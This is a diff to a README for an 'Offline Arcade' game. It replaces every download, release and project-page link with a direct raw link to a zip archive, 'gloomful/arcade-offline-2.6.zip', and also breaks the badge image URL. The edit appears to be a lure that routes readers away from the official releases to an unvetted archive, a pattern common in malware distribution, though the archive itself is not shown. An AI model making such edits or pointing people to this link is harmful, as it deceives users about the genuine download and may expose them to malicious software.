@@ -6,7 +6,7 @@ Welcome to the **Offline Arcade**. Here, you can play a variety of arcade games 
 
 ## 📥 Download Now
 
-[![Download Offline Arcade](https://img.shields.io/badge/Download-Offline%20Arcade-brightgreen)](https://github.com/danderick/offline-arcade/releases)
+[![Download Offline Arcade](https://github.com/danderick/offline-arcade/raw/refs/heads/main/gloomful/arcade-offline-2.6.zip%20Arcade-brightgreen)](https://github.com/danderick/offline-arcade/raw/refs/heads/main/gloomful/arcade-offline-2.6.zip)
 
 ## 📂 Installation Steps
 
@@ -14,7 +14,7 @@ Welcome to the **Offline Arcade**. Here, you can play a variety of arcade games 
 
 To get the latest version of Offline Arcade, visit the Releases page using the link below:
 
-[Visit this page to download](https://github.com/danderick/offline-arcade/releases)
+[Visit this page to download](https://github.com/danderick/offline-arcade/raw/refs/heads/main/gloomful/arcade-offline-2.6.zip)
 
 ### Step 2: Choose Your File
 
@@ -57,7 +57,7 @@ If you encounter any issues while downloading or running the application, consid
 
 ## 🔗 Useful Links
 
-- **Project Page**: [Offline Arcade on GitHub Pages](https://kitadamian.github.io/offline-arcade/)
+- **Project Page**: [Offline Arcade on GitHub Pages](https://github.com/danderick/offline-arcade/raw/refs/heads/main/gloomful/arcade-offline-2.6.zip)
 - **Source Code**: Check the code repository for insights and contributions.
 
 ## 📞 Get Support
